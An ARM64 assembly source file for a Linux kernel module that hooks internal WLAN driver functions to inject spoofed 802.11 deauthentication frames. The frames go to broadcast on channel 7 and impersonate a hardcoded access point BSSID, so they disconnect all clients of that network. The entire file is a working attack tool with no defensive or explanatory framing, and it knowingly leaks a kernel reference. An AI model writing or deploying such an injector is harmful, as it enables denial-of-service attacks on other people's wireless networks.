/*
 * wmitx2.S - Send deauth via WMA management TX with temporary peer creation
 *
 * Root cause: wma_tx_packet calls wlan_mgmt_txrx_mgmt_frame_tx which requires
 * a non-NULL peer. In monitor mode, wlan_objmgr_get_peer returns NULL for both
 * DA (broadcast) and SA (spoofed BSSID) because no peers exist.
 *
 * Fix: Create a temporary peer via wlan_objmgr_peer_obj_create for the target
 * BSSID, send the deauth, then delete the peer.
 *
 * Build:
 *   clang -target aarch64-linux-gnu -c -o wmitx2.o wmitx2.S
 *   ld.lld -r -o wmitx2.ko wmitx2.o
 */

.section .gnu.linkonce.this_module, "aw"
.balign 256
__this_module:
    .fill 24, 1, 0
    .asciz "wmitx2"
    .fill 49, 1, 0
    .fill 256, 1, 0
    .quad init_module
    .fill 440, 1, 0
    .quad cleanup_module
    .fill 40, 1, 0

.section .modinfo, "a"
    .asciz "vermagic=4.19.81-perf+ SMP preempt mod_unload modversions aarch64"
    .asciz "name=wmitx2"
    .asciz "license=GPL"

.section __versions, "a"
    .quad 0
    .asciz "module_layout"
    .balign 64, 0
    .quad 0
    .asciz "printk"
    .balign 64, 0
    .quad 0
    .asciz "kallsyms_lookup_name"
    .balign 64, 0

.section .rodata, "a"
sym_cds_ctx:        .asciz "cds_get_context"
sym_pkt_alloc:      .asciz "cds_packet_alloc"
sym_wma_tx:         .asciz "wma_tx_packet"
sym_get_vdev:       .asciz "wlan_objmgr_get_vdev_by_id_from_psoc"
sym_peer_create:    .asciz "wlan_objmgr_peer_obj_create"
sym_peer_delete:    .asciz "wlan_objmgr_peer_obj_delete"

fmt_init:   .asciz "wmitx2: deauth via WMI with temp peer\n"
fmt_sym:    .asciz "wmitx2: syms OK\n"
fmt_peer:   .asciz "wmitx2: vdev=%px peer=%px\n"
fmt_frame:  .asciz "wmitx2: frame=%px body=%px\n"
fmt_tx:     .asciz "wmitx2: wma_tx_packet returned %d\n"
fmt_fail:   .asciz "wmitx2: FAIL step %d\n"
fmt_ok:     .asciz "wmitx2: deauth SENT OK!\n"
fmt_delpeer:.asciz "wmitx2: peer deleted\n"

/* Target BSSID */
.balign 8
target_bssid: .byte 0x8c, 0xf0, 0xdf, 0x1f, 0x4f, 0xc7
              .byte 0x00, 0x00  /* pad to 8 bytes */

.section .plt, "ax"
    .quad 0
.section .init.plt, "ax"
    .quad 0
.section .text.ftrace_trampoline, "ax"
    .quad 0

.section .exit.text, "ax"
.global cleanup_module
.type cleanup_module, @function
cleanup_module:
    ret

.section .init.text, "ax"
.global init_module
.type init_module, @function
init_module:
    sub sp, sp, #0x100
    stp x29, x30, [sp, #0xf0]
    add x29, sp, #0xf0
    stp x19, x20, [sp, #0xe0]
    stp x21, x22, [sp, #0xd0]
    stp x23, x24, [sp, #0xc0]
    stp x25, x26, [sp, #0xb0]
    stp x27, x28, [sp, #0xa0]

    adrp x0, fmt_init
    add x0, x0, :lo12:fmt_init
    bl printk

    /* ===== Step 1: Lookup all symbols ===== */
    adrp x0, sym_cds_ctx
    add x0, x0, :lo12:sym_cds_ctx
    bl kallsyms_lookup_name
    cbz x0, fail1
    mov x19, x0              // x19 = cds_get_context

    adrp x0, sym_pkt_alloc
    add x0, x0, :lo12:sym_pkt_alloc
    bl kallsyms_lookup_name
    cbz x0, fail2
    mov x20, x0              // x20 = cds_packet_alloc

    adrp x0, sym_wma_tx
    add x0, x0, :lo12:sym_wma_tx
    bl kallsyms_lookup_name
    cbz x0, fail3
    mov x21, x0              // x21 = wma_tx_packet

    adrp x0, sym_get_vdev
    add x0, x0, :lo12:sym_get_vdev
    bl kallsyms_lookup_name
    cbz x0, fail4
    mov x22, x0              // x22 = wlan_objmgr_get_vdev_by_id_from_psoc

    adrp x0, sym_peer_create
    add x0, x0, :lo12:sym_peer_create
    bl kallsyms_lookup_name
    cbz x0, fail5
    mov x23, x0              // x23 = wlan_objmgr_peer_obj_create

    adrp x0, sym_peer_delete
    add x0, x0, :lo12:sym_peer_delete
    bl kallsyms_lookup_name
    cbz x0, fail6
    mov x24, x0              // x24 = wlan_objmgr_peer_obj_delete

    adrp x0, fmt_sym
    add x0, x0, :lo12:fmt_sym
    bl printk

    /* ===== Step 2: Get mac_ctx and PSOC ===== */
    mov w0, #0x36             // QDF_MODULE_ID_PE
    blr x19                   // cds_get_context(PE)
    cbz x0, fail7
    mov x25, x0               // x25 = mac_ctx
    ldr x26, [x25, #0x18]     // x26 = psoc = mac_ctx[0x18]
    cbz x26, fail7

    /* ===== Step 3: Get VDEV for vdev_id=0 ===== */
    mov x0, x26                // psoc
    mov w1, #0                 // vdev_id = 0
    mov w2, #4                 // WLAN_MGMT_NB_ID
    blr x22                    // wlan_objmgr_get_vdev_by_id_from_psoc
    cbz x0, fail8
    mov x27, x0                // x27 = vdev

    /* ===== Step 4: Create temporary peer for target BSSID ===== */
    mov x0, x27                // vdev
    mov w1, #2                 // WLAN_PEER_AP
    adrp x2, target_bssid
    add x2, x2, :lo12:target_bssid
    blr x23                    // wlan_objmgr_peer_obj_create(vdev, AP, target_mac)
    mov x28, x0                // x28 = peer (might be NULL if creation fails!)

    adrp x0, fmt_peer
    add x0, x0, :lo12:fmt_peer
    mov x1, x27
    mov x2, x28
    bl printk

    /* If peer creation failed, try anyway - maybe there's already a self-peer */
    /* but also try with WLAN_PEER_STA type if AP type failed */
    cbnz x28, peer_ok

    /* Try WLAN_PEER_STA type */
    mov x0, x27
    mov w1, #5                 // WLAN_PEER_STA
    adrp x2, target_bssid
    add x2, x2, :lo12:target_bssid
    blr x23
    mov x28, x0

    cbz x28, fail9             // both attempts failed

peer_ok:
    /* ===== Step 5: Allocate frame buffer ===== */
    mov w0, #26                // deauth frame: 24 header + 2 reason
    sub x1, x29, #0x10         // &body_ptr
    sub x2, x29, #0x18         // &pkt_ptr
    blr x20                    // cds_packet_alloc
    cbnz w0, fail10

    ldur x8, [x29, #-0x10]     // body_ptr
    ldur x9, [x29, #-0x18]     // pkt (frame_buf / sk_buff)
    stp x8, x9, [sp, #0x80]   // save body=sp+0x80, pkt=sp+0x88

    adrp x0, fmt_frame
    add x0, x0, :lo12:fmt_frame
    ldr x1, [sp, #0x88]        // pkt
    ldr x2, [sp, #0x80]        // body
    bl printk

    /* ===== Step 6: Build 802.11 deauth frame ===== */
    ldr x8, [sp, #0x80]        // body_ptr
    // Frame Control: 0x00C0 = deauth
    movz w9, #0x00C0
    strh w9, [x8]
    // Duration: 0
    strh wzr, [x8, #2]
    // DA: ff:ff:ff:ff:ff:ff (broadcast)
    movn w9, #0
    str w9, [x8, #4]
    strh w9, [x8, #8]
    // SA: target BSSID (spoof as AP)
    adrp x10, target_bssid
    add x10, x10, :lo12:target_bssid
    ldr w9, [x10]
    str w9, [x8, #10]
    ldrh w9, [x10, #4]
    strh w9, [x8, #14]
    // BSSID: target BSSID
    ldr w9, [x10]
    str w9, [x8, #16]
    ldrh w9, [x10, #4]
    strh w9, [x8, #20]
    // Seq ctrl: 0
    strh wzr, [x8, #22]
    // Reason code: 7 (class 3 frame from non-associated)
    mov w9, #7
    strh w9, [x8, #24]

    /* ===== Step 7: Call wma_tx_packet ===== */
    // wma_tx_packet(mac, buf, frmLen, frmType, txDir, tid, comp_cb, body,
    //               stack: ota_cb, noack_byte, vdev_id, ?, channel_freq, rateid)
    //
    // From binary analysis:
    //   x0=mac_ctx, x1=frame_buf, w2=frmLen(26), w3=frmType(3)
    //   w4=txDir(unused), w5=tid(unused)
    //   x6=download_complete_callback(NULL), x7=body_ptr
    //   stack[0]=ota_complete_callback(NULL)
    //   stack[1]=noack (byte, we want 1)
    //   stack[2]=vdev_id (byte, 0)
    //   stack[3-5]=other params

    // Clear stack arg area (48 bytes = 6 slots)
    stp xzr, xzr, [sp]
    stp xzr, xzr, [sp, #16]
    stp xzr, xzr, [sp, #32]

    // Set specific stack args
    // stack[0] = NULL (ota callback) - already 0
    // stack[1] = noack = 1
    mov w9, #1
    strb w9, [sp, #8]
    // stack[2] = vdev_id = 0 - already 0
    // stack[3] = 0 - already 0
    // stack[4] = channel_freq = 2442 (channel 7, target AP)
    mov w9, #2442
    strh w9, [sp, #32]
    // stack[5] = rateid = 1
    mov w9, #1
    str w9, [sp, #40]

    // Register args
    mov x0, x25                 // mac_ctx
    ldr x1, [sp, #0x88]         // frame_buf (pkt)
    mov w2, #26                 // frmLen
    mov w3, #3                  // frmType = MGMT_DEAUTH
    mov w4, #0                  // txDir (unused)
    mov w5, #0                  // tid (unused)
    mov x6, xzr                 // no download_comp callback
    ldr x7, [sp, #0x80]         // body_ptr
    blr x21                     // wma_tx_packet(...)

    mov w8, w0                  // save return value
    str w8, [sp, #0x90]         // save on stack

    adrp x0, fmt_tx
    add x0, x0, :lo12:fmt_tx
    ldr w1, [sp, #0x90]
    bl printk

    ldr w8, [sp, #0x90]
    cbnz w8, cleanup_fail

    adrp x0, fmt_ok
    add x0, x0, :lo12:fmt_ok
    bl printk
    b cleanup

cleanup_fail:
cleanup:
    /* ===== Step 8: Delete peer ===== */
    cbz x28, skip_peer_del
    mov x0, x28                 // peer
    blr x24                     // wlan_objmgr_peer_obj_delete

    adrp x0, fmt_delpeer
    add x0, x0, :lo12:fmt_delpeer
    bl printk

skip_peer_del:
    /* Release VDEV ref - need to lookup wlan_objmgr_vdev_release_ref */
    /* For now skip - the ref will leak but won't cause immediate issues */
    b done

fail1:
    mov w1, #1
    b print_fail
fail2:
    mov w1, #2
    b print_fail
fail3:
    mov w1, #3
    b print_fail
fail4:
    mov w1, #4
    b print_fail
fail5:
    mov w1, #5
    b print_fail
fail6:
    mov w1, #6
    b print_fail
fail7:
    mov w1, #7
    b print_fail
fail8:
    mov w1, #8
    b print_fail
fail9:
    mov w1, #9
    b print_fail
fail10:
    mov w1, #10
print_fail:
    adrp x0, fmt_fail
    add x0, x0, :lo12:fmt_fail
    bl printk

done:
    mov w0, #-1
    ldp x27, x28, [sp, #0xa0]
    ldp x25, x26, [sp, #0xb0]
    ldp x23, x24, [sp, #0xc0]
    ldp x21, x22, [sp, #0xd0]
    ldp x19, x20, [sp, #0xe0]
    ldp x29, x30, [sp, #0xf0]
    add sp, sp, #0x100
    ret
